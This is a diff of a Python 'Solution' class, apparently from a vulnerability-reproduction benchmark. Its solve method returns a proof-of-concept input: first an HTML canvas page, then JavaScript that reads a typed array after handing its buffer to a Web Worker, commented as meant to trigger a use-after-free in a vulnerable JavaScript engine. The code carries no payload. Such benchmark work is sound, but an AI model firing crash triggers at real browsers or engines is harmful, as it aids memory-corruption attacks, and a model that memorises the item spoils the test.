@@ -1,30 +1,42 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        poc = r'''<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>UAF PoC</title>
-</head>
-<body>
-    <canvas id="myCanvas" width="400" height="400" style="border:1px solid #000000;"></canvas>
-    <script>
-        var canvas = document.getElementById("myCanvas");
-        var ctx = canvas.getContext("2d");
-        var imageData = ctx.createImageData(400, 400);
-        var data = imageData.data;
-        for (var i = 0; i < data.length; i += 4) {
-            data[i] = 255;
-            data[i + 1] = 255;
-            data[i + 2] = 255;
-            data[i + 3] = 255;
+        poc = """
+let buffer = new ArrayBuffer(1024 * 4);
+let clamped = new Uint8ClampedArray(buffer);
+for (let i = 0; i < clamped.length; i++) {
+    clamped[i] = i % 256;
+}
+
+const worker_script = `
+onmessage = function(e) {
+    const arr = new Uint8Array(e.data);
+    for (let i = 0; i < 100; i++) {
+        arr[i] = arr[i] + 1;
+    }
+    postMessage('processed');
+};
+`;
+
+const blob = new Blob([worker_script], { type: 'application/javascript' });
+const worker_url = URL.createObjectURL(blob);
+const worker = new Worker(worker_url);
+
+const transferred_buffer = buffer;
+worker.postMessage(transferred_buffer, [transferred_buffer]);
+
+// Give time for worker to process
+setTimeout(() => {
+    // Access after transfer, should UAF in vulnerable impl
+    for (let i = 0; i < 100; i++) {
+        const val = clamped[i];
+        if (val !== (i % 256)) {
+            console.log('Modified:', val);
         }
-        ctx.putImageData(imageData, 0, 0);
-        var anotherData = ctx.createImageData(200, 200);
-        ctx.putImageData(anotherData, 100, 100);
-        data[0] = 0;
-        ctx.putImageData(imageData, 0, 0);
-    </script>
-</body>
-</html>'''
+    }
+    worker.terminate();
+    URL.revokeObjectURL(worker_url);
+}, 100);
+
+console.log('PoC executed');
+"""
         return poc.encode('utf-8')
